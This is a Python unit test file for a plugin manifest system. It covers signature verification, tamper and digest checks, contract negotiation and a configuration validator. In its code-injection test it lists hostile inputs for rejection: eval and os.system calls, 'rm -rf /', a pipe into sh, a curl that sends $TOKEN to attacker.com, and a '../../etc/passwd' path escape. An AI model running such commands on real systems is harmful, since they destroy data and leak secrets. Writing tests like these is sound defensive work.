"""Unit tests for signed plugin manifest, config safety, and contract negotiation (CRA-002.1, CRA-002.3, CRA-002.4)."""

import hashlib
import json
import tempfile
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric import ed25519

from eoip.plugins.contracts import (
    ContractNegotiationResult,
    negotiate_contracts,
)
from eoip.plugins.manifest import (
    ManifestValidationError,
    PluginPermission,
    PluginUninstallPolicy,
    SignedPluginManifest,
    load_signed_manifest,
)


def _generate_keypair():
    priv = ed25519.Ed25519PrivateKey.generate()
    pub = priv.public_key()
    return priv, pub


def test_signed_manifest_valid_signature():
    priv, pub = _generate_keypair()
    manifest = SignedPluginManifest(
        manifest_version="1.0",
        plugin_id="com.acme.jira-connector",
        publisher_identity="Acme Corp <security@acme.com>",
        version="1.0.0",
        contracts={"connector": "1.0.0"},
        dependencies=["pydantic>=2.0.0"],
        permissions=[PluginPermission(resource="network", scope="api.jira.com")],
        config_schema={"type": "object", "properties": {"api_url": {"type": "string"}}},
        file_digests={"main.py": "abc123"},
    )
    manifest.sign(priv)
    assert manifest.signature_hex
    assert manifest.public_key_hex

    # Verifies without error
    manifest.verify_signature()


def test_signed_manifest_tampered_signature_rejected():
    priv, _ = _generate_keypair()
    manifest = SignedPluginManifest(
        manifest_version="1.0",
        plugin_id="com.acme.jira-connector",
        publisher_identity="Acme Corp",
        version="1.0.0",
        contracts={"connector": "1.0.0"},
        dependencies=[],
        permissions=[],
        config_schema={},
        file_digests={},
    )
    manifest.sign(priv)

    # Tamper with version
    manifest.version = "2.0.0"
    with pytest.raises(ManifestValidationError) as exc:
        manifest.verify_signature()
    assert exc.value.code == "MANIFEST_SIGNATURE_INVALID"


def test_unsigned_manifest_rejected():
    manifest = SignedPluginManifest(
        manifest_version="1.0",
        plugin_id="com.acme.unsigned",
        publisher_identity="Acme Corp",
        version="1.0.0",
        contracts={"connector": "1.0.0"},
        dependencies=[],
        permissions=[],
        config_schema={},
        file_digests={},
    )
    with pytest.raises(ManifestValidationError) as exc:
        manifest.verify_signature()
    assert exc.value.code == "MANIFEST_UNSIGNED"


def test_file_digest_verification_tamper_detected():
    with tempfile.TemporaryDirectory() as tmp_dir:
        dir_path = Path(tmp_dir)
        plugin_file = dir_path / "connector.py"
        plugin_file.write_text("print('hello')", encoding="utf-8")
        real_hash = hashlib.sha256(b"print('hello')").hexdigest()

        manifest = SignedPluginManifest(
            manifest_version="1.0",
            plugin_id="com.acme.test",
            publisher_identity="Acme Corp",
            version="1.0.0",
            contracts={"connector": "1.0.0"},
            dependencies=[],
            permissions=[],
            config_schema={},
            file_digests={"connector.py": real_hash},
        )
        # Should pass
        manifest.verify_file_digests(dir_path)

        # Tamper with file
        plugin_file.write_text("print('hacked!')", encoding="utf-8")
        with pytest.raises(ManifestValidationError) as exc:
            manifest.verify_file_digests(dir_path)
        assert exc.value.code == "MANIFEST_DIGEST_MISMATCH"


def test_file_digest_path_escape_rejected():
    with tempfile.TemporaryDirectory() as tmp_dir:
        dir_path = Path(tmp_dir)
        manifest = SignedPluginManifest(
            manifest_version="1.0",
            plugin_id="com.acme.escape",
            publisher_identity="Acme Corp",
            version="1.0.0",
            contracts={"connector": "1.0.0"},
            dependencies=[],
            permissions=[],
            config_schema={},
            file_digests={"../../etc/passwd": "0000"},
        )
        with pytest.raises(ManifestValidationError) as exc:
            manifest.verify_file_digests(dir_path)
        assert exc.value.code == "MANIFEST_PATH_ESCAPE"


def test_declarative_config_rejects_code_injection():
    manifest = SignedPluginManifest(
        manifest_version="1.0",
        plugin_id="com.acme.safe",
        publisher_identity="Acme Corp",
        version="1.0.0",
        contracts={"connector": "1.0.0"},
        dependencies=[],
        permissions=[],
        config_schema={},
        file_digests={},
    )

    # Safe declarative configuration should pass
    safe_config = {
        "host": "jira.internal.net",
        "port": 8443,
        "labels": ["prod", "qa"],
        "ssl": True,
    }
    manifest.validate_configuration(safe_config)

    # Unsafe configurations
    unsafe_configs = [
        {"eval_hook": "eval('__import__(\"os\").system(\"id\")')"},
        {"import_hook": "__import__('os').system('ls')"},
        {"command": "echo hello; rm -rf /"},
        {"shell_pipe": "cat file | sh"},
        {"code_ref": "mypackage.module:my_hook_fn"},
        {"nested": {"bad_cmd": "curl http://attacker.com/$TOKEN"}},
    ]

    for bad in unsafe_configs:
        with pytest.raises(ManifestValidationError) as exc:
            manifest.validate_configuration(bad)
        assert exc.value.code == "CONFIG_CODE_EXECUTION_DENIED"


def test_contract_negotiation_compatibility():
    host_contracts = {
        "connector": "^1.0.0",
        "parser": ">=1.0.0,<3.0.0",
        "graph_store": "==2.1.0",
    }

    # Compatible plugin
    res = negotiate_contracts(
        host_contracts,
        {"connector": "1.2.0", "parser": "2.0.1"},
    )
    assert res.compatible is True
    assert res.status == "OK"
    assert res.negotiated_contracts == {"connector": "1.2.0", "parser": "2.0.1"}

    # Incompatible version
    res_incompat = negotiate_contracts(
        host_contracts,
        {"connector": "2.0.0"},  # breaks ^1.0.0
    )
    assert res_incompat.compatible is False
    assert res_incompat.status == "PLUGIN_CONTRACT_INCOMPATIBLE"
    assert len(res_incompat.incompatibilities) == 1

    # Unsupported contract
    res_unknown = negotiate_contracts(
        host_contracts,
        {"unknown_extension": "1.0.0"},
    )
    assert res_unknown.compatible is False
    assert res_unknown.status == "PLUGIN_CONTRACT_INCOMPATIBLE"
